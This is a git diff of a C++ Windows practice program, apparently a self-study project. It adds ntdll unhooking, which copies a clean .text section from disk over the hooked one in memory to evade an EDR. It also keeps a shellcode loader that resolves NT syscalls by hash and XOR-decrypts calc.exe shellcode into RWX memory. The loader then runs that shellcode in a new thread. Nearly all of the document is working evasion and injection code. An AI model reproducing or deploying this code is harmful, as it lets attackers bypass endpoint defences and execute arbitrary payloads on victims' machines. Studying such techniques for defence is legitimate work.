@@ -1,15 +1,18 @@
 /*
 This program is designed to help me practice parsing the PEB and other critical data structures to find and manipulate data as needed
+// Let's try to bypass our custom EDR by unhooking the "hooked" NTDLL with a clean copy from disk
 */
 // Includes
 #include <wchar.h>
 #include <Windows.h>
 #include <winnt.h>
+#include <cstdio>
 #include <intrin.h>
 #include <iostream>
 #include <winternl.h>
 #include "Djb2.h"
 #include "XOR.h"
+#include "Stuff.h"
 
 #define NTDLL_HASH 0xa58d6fbb // ntdll.dll
 #define NTALLOCATEVIRTMEM_HASH 0xa0d6f67a  // NtAllocateVirtualMemory
@@ -47,6 +50,38 @@ unsigned char calc[] =
 "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
 "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
 
+// Define a function that locates the base address of ntdll from disk
+
+BOOL findCleanNtdll(_Out_ PVOID* ppCleanNtBase) {
+	
+	// Obtain a handle to ntdll -> not really focused on stealth at the moment
+	HANDLE hNtdll = CreateFileA("C:\\Windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (hNtdll == INVALID_HANDLE_VALUE) {
+		std::cout << "Failed to obtain handle to NTDLL: 0x" << std::hex << GetLastError() << std::endl;
+		return FALSE;
+	}
+	// If we have obtained our handle, we need to create a file mapping
+	HANDLE ntMapping = CreateFileMappingA(hNtdll, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL); // This call is hooked by the EDR via NtCreateSection
+	if (ntMapping == NULL) {
+		std::cout << "Failed to create file mapping: 0x" << std::hex << GetLastError() << std::endl;
+		CloseHandle(hNtdll); // Close Handle if we fail to create file mapping
+		return FALSE;
+	}
+	// If our mapping is created, let's call MapViewOfFile
+	LPVOID ntMapView = MapViewOfFile(ntMapping, FILE_MAP_READ, 0, 0, 0); // Should be hooked by EDR
+	if (ntMapView == NULL) {
+		std::cout << "Failed to map view of NTDLL: 0x" << std::hex << GetLastError() << std::endl;
+		CloseHandle(hNtdll);
+		CloseHandle(ntMapping); // Close handles in case we fail to map view of file
+		return FALSE;
+	}
+	std::cout << "Clean NTDLL Base Address: 0x" << std::hex << ntMapView << std::endl;
+	*ppCleanNtBase = ntMapView;
+
+	return TRUE;
+}
+
+// ntWalker is sort of our do-it-all function that finds the base address of ntdll for us
 DWORD ntWalker() {
 #ifdef _WIN64
 	PPEB pPeb = (PPEB)__readgsqword(0x60);
@@ -55,158 +90,27 @@ DWORD ntWalker() {
 #else
 #error Unsupported Platform
 #endif
+	// Let's attempt to overwrite ntdll base after we invoke the EDR
+	// Acquire PVOID to clean ntdll base addr
+	
+	PVOID pCleanNtdllBase = NULL;
+	if (!findCleanNtdll(&pCleanNtdllBase)) {
+		std::cout << "Error executing function to locate base address of unhooked DLL" << std::endl;
+		return 1;
+	}
+	if (pCleanNtdllBase == NULL) {
+		std::cout << "Unhooked NTDLL Base Address is invalid!" << std::endl;
+		return 1;
+	}
+	// Calculate Address of Text Section
+	PBYTE pCleanNtTxt = (PBYTE)pCleanNtdllBase + 4096;
+	// Assuming we have our clean nt txt base, we need to first find the hooked nt txt base and then overwrite it
+	// Hooked Text variables for addr and size
 
-	//TODO: Define Necessary structures for NTAPI Calls
-	typedef struct _PS_ATTRIBUTE
-	{
-		ULONG_PTR Attribute;
-		SIZE_T Size;
-		union
-		{
-			ULONG_PTR Value;
-			PVOID ValuePtr;
-		};
-		PSIZE_T ReturnLength;
-	} PS_ATTRIBUTE, *PPS_ATTRIBUTE;
-
-	typedef struct _PS_ATTRIBUTE_LIST
-	{
-		SIZE_T TotalLength;
-		PS_ATTRIBUTE Attributes[1];
-	} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;
-
-	typedef enum _PS_CREATE_STATE
-	{
-		PsCreateInitialState,
-		PsCreateFailOnFileOpen,
-		PsCreateFailOnSectionCreate,
-		PsCreateFailExeFormat,
-		PsCreateFailMachineMismatch,
-		PsCreateFailExeName, // Debugger specified
-		PsCreateSuccess,
-		PsCreateMaximumStates
-	} PS_CREATE_STATE;
-
-	typedef struct _PS_CREATE_INFO
-	{
-		SIZE_T Size;
-		PS_CREATE_STATE State;
-		union
-		{
-			// PsCreateInitialState
-			struct
-			{
-				union
-				{
-					ULONG InitFlags;
-					struct
-					{
-						UCHAR WriteOutputOnExit : 1;
-						UCHAR DetectManifest : 1;
-						UCHAR IFEOSkipDebugger : 1;
-						UCHAR IFEODoNotPropagateKeyState : 1;
-						UCHAR SpareBits1 : 4;
-						UCHAR SpareBits2 : 8;
-						USHORT ProhibitedImageCharacteristics : 16;
-					};
-				};
-				ACCESS_MASK AdditionalFileAccess;
-			} InitState;
-
-			// PsCreateFailOnSectionCreate
-			struct
-			{
-				HANDLE FileHandle;
-			} FailSection;
-
-			// PsCreateFailExeFormat
-			struct
-			{
-				USHORT DllCharacteristics;
-			} ExeFormat;
-
-			// PsCreateFailExeName
-			struct
-			{
-				HANDLE IFEOKey;
-			} ExeName;
-
-			// PsCreateSuccess
-			struct
-			{
-				union
-				{
-					ULONG OutputFlags;
-					struct
-					{
-						UCHAR ProtectedProcess : 1;
-						UCHAR AddressSpaceOverride : 1;
-						UCHAR DevOverrideEnabled : 1; // from Image File Execution Options
-						UCHAR ManifestDetected : 1;
-						UCHAR ProtectedProcessLight : 1;
-						UCHAR SpareBits1 : 3;
-						UCHAR SpareBits2 : 8;
-						USHORT SpareBits3 : 16;
-					};
-				};
-				HANDLE FileHandle;
-				HANDLE SectionHandle;
-				ULONGLONG UserProcessParametersNative;
-				ULONG UserProcessParametersWow64;
-				ULONG CurrentParameterFlags;
-				ULONGLONG PebAddressNative;
-				ULONG PebAddressWow64;
-				ULONGLONG ManifestAddress;
-				ULONG ManifestSize;
-			} SuccessState;
-		};
-	} PS_CREATE_INFO, *PPS_CREATE_INFO;
-
-	//TODO: Define function prototypes for Nt functions
-	// NtAllocateVirtualMemory
-	typedef NTSTATUS(NTAPI* pNtAllocateVirtualMem)(
-		HANDLE		ProcHandle,
-		PVOID* BaseAddress,
-		ULONG_PTR	ZeroBits,
-		PSIZE_T		RegionSize,
-		ULONG		AllocationType,
-		ULONG		Protect
-		);
-
-	// NtWriteVirtualMemory
-	typedef NTSTATUS(NTAPI* pNtWriteVirtualMem)(
-		HANDLE		ProcHandle,
-		PVOID		BaseAddress,
-		PVOID		Buffer,
-		SIZE_T		NumOfBytesToWrite,
-		PSIZE_T		NumOfBytesWritten
-		);
-
-	// NtProtectVirtualMemory
-	typedef NTSTATUS(NTAPI* pNtProtectVirtualMem)(
-		HANDLE		ProcHandle,
-		PVOID* BaseAddress,
-		PSIZE_T		RegionSize,
-		ULONG		NewProtection,
-		PULONG		OldProtection
-		);
-
-	// NtCreateThreadEx
-	typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
-		PHANDLE				ThreadHandle,
-		ACCESS_MASK			DesiredAccess,
-		POBJECT_ATTRIBUTES	ObjectAttributes,
-		HANDLE				ProcessHandle,
-		PVOID				StartRoutine,
-		PVOID				Argument,
-		ULONG				CreateFlags,
-		SIZE_T				ZeroBits,
-		SIZE_T				StackSize,
-		SIZE_T				MaximumStackSize,
-		PPS_ATTRIBUTE_LIST	AttributeList
-		);
-
-	// TODO: Walk Ldr Doubly Linked List
+	PVOID LocalNtTxt = NULL;
+	ULONG LocalNtTxtSize = 0;
+	
+	// TODO: Walk Ldr Doubly Linked List to find ntdll
 	PPEB_LDR_DATA pLdr = pPeb->Ldr;
 	PLIST_ENTRY pLdrListEntry = &pLdr->InMemoryOrderModuleList;
 	PLIST_ENTRY pCurr = pLdrListEntry->Flink;
@@ -230,7 +134,6 @@ DWORD ntWalker() {
 	}
 	else {
 		std::wcout << L"Found Module!" << std::endl;
-		std::cout << "Module Address: 0x" << std::hex << g_ntBase << std::endl;
 	}
 	/*
 	/////////////IMAGE DOS HEADER///////////////
@@ -241,7 +144,6 @@ DWORD ntWalker() {
 		std::cerr << "Invalid DOS Signature!" << std::endl;
 		return -1;
 	}
-	std::cout << "DOS Signature: 0x" << pImgDosHdr->e_magic << std::endl;
 
 	/*
 	/////////////IMAGE NT HEADER///////////////
@@ -256,6 +158,44 @@ DWORD ntWalker() {
 
 	/////////////IMAGE OPTIONAL HEADER///////////////
 	PIMAGE_OPTIONAL_HEADER pImgOptHdr = &pImgNtHdr->OptionalHeader;
+	// Added Capability to find g_ntBase .text section and size
+	
+	PIMAGE_SECTION_HEADER pLocalNtClean = IMAGE_FIRST_SECTION(pImgNtHdr);
+	for (DWORD i{ 0 }; i < pImgNtHdr->FileHeader.NumberOfSections; i++) {
+		if (strcmp((char*)pLocalNtClean[i].Name, (char*)".text") == 0) {
+			// if we identify the .text section, let's grab its ase address
+			LocalNtTxt = (PVOID)((ULONG_PTR)g_ntBase + pLocalNtClean[i].VirtualAddress);
+			LocalNtTxtSize = pLocalNtClean[i].Misc.VirtualSize;
+			break;
+		}
+	}
+	if (LocalNtTxt == NULL || LocalNtTxtSize == 0) {
+		std::cout << "Error acquiring hooked NTDLL Text Address and Size" << std::endl;
+		return 1;
+	}
+
+	std::cout << "Hooked NTDLL Text Address: 0x" << std::hex << LocalNtTxt << std::endl;
+	std::cout << "Hooked NTDLL Text Size in Bytes: " << LocalNtTxtSize << std::endl;
+
+	
+	// Assuming we have our hooked text section and size, we are ready to overwrite
+	DWORD dwOldProtect = NULL;
+	if (!VirtualProtect(LocalNtTxt, LocalNtTxtSize, PAGE_EXECUTE_WRITECOPY, &dwOldProtect)) { // We can attempt to hook this and verify if address is *BaseAddress + 0x1000
+		std::cout << "Virtual Protect failed with error: 0x" << std::hex << GetLastError() << std::endl;
+		return 1;
+	}
+	// perform copy assuming we updated perms successfully
+	memcpy(LocalNtTxt, pCleanNtTxt, LocalNtTxtSize);
+
+	std::cout << "NTDLL Unhooked Successfully!" << std::endl;
+	// Restore previous permissions for hooked ntdll
+	if (!VirtualProtect(LocalNtTxt, LocalNtTxtSize, dwOldProtect, &dwOldProtect)) {
+		std::cout << "Could not restore memory permissions on Text section" << std::endl;
+		return 1;
+	}
+
+ // Uncomment above to enable EDR evasion via UNHOOKING NTDLL
+ 
 
 	/*
 	typedef struct _IMAGE_EXPORT_DIRECTORY {
@@ -307,10 +247,10 @@ DWORD ntWalker() {
 		std::cerr << "Memory addresses were not populated successfully" << std::endl;
 	}
 	// TODO: Cast function addresses to their respective call structures as manually defined above
-	pNtAllocateVirtualMem NtAlloc =		(pNtAllocateVirtualMem)g_ntAlloc;
-	pNtWriteVirtualMem NtWrite =		(pNtWriteVirtualMem)g_ntWrite;
-	pNtProtectVirtualMem NtProtect =	(pNtProtectVirtualMem)g_ntProtect;
-	pNtCreateThreadEx NtThread =		(pNtCreateThreadEx)g_ntThread;
+	pNtAllocateVirtualMem NtAlloc = (pNtAllocateVirtualMem)g_ntAlloc;
+	pNtWriteVirtualMem NtWrite = (pNtWriteVirtualMem)g_ntWrite;
+	pNtProtectVirtualMem NtProtect = (pNtProtectVirtualMem)g_ntProtect;
+	pNtCreateThreadEx NtThread = (pNtCreateThreadEx)g_ntThread;
 
 	// Init Vars for NT syscalls
 	NTSTATUS Status = 0x00;
@@ -324,7 +264,7 @@ DWORD ntWalker() {
 	PBYTE pEncryptedPayload = XorPayload(calc, szPayloadSize, 0x9A); // Change key per run
 
 	// Call NtAllocateVirtualMemory
-	NTSTATUS status = NtAlloc(GetCurrentProcess(),
+	NTSTATUS status = NtAlloc((HANDLE)-1, // We will test our Custom EDR to see if this still hooks
 		&pAddress,
 		0,
 		&szPayloadSize,
@@ -336,9 +276,9 @@ DWORD ntWalker() {
 	else {
 		std::cerr << "NtAllocateVirtualMemory Failed with error: 0x" << std::hex << status << std::endl;
 	}
-	
+
 	// Call NtWriteProcessMemory
-	NTSTATUS status_write = NtWrite(GetCurrentProcess(), pAddress, pEncryptedPayload, szPayloadSize, &szNumBytesWritten);
+	NTSTATUS status_write = NtWrite((HANDLE)-1, pAddress, pEncryptedPayload, szPayloadSize, &szNumBytesWritten);
 	if (NT_SUCCESS(status_write)) {
 		std::cout << "Successfully wrote: " << szPayloadSize << " bytes to memory" << std::endl;
 	}
@@ -347,7 +287,7 @@ DWORD ntWalker() {
 	}
 
 	// Call NtProtectVirtualMemory
-	NTSTATUS status_prot = NtProtect(GetCurrentProcess(), &pAddress, &szPayloadSize, PAGE_EXECUTE_READWRITE, &uOldProtect);
+	NTSTATUS status_prot = NtProtect((HANDLE)-1, &pAddress, &szPayloadSize, PAGE_EXECUTE_READWRITE, &uOldProtect);
 	if (NT_SUCCESS(status_prot)) {
 		std::cout << "Successfully updated memory permissions to RWX" << std::endl;
 	}
@@ -360,15 +300,20 @@ DWORD ntWalker() {
 	XorPayload((unsigned char*)pAddress, szPayloadSize, 0x9A);
 
 	// Call NtCreateThreadEx
-	NTSTATUS status_thread = NtThread(&hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), pAddress, NULL, NULL, NULL, NULL, NULL, NULL);
+	NTSTATUS status_thread = NtThread(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, pAddress, NULL, NULL, NULL, NULL, NULL, NULL);
 	if (!NT_SUCCESS(status_thread)) {
 		std::cerr << "NtCreateThreadEx failed with error: 0x" << std::hex << status_thread << std::endl;
 	}
 
 	WaitForSingleObject(hThread, INFINITE);
 }
+int main() {
 
-INT main(VOID) {
-
+	HMODULE hMod = LoadLibrary(L"fHooks.dll");
+	if (hMod == NULL) {
+		std::cout << "Could not load EDR" << std::endl;
+		return 1;
+	}
 	ntWalker();
+	return 0;
 }
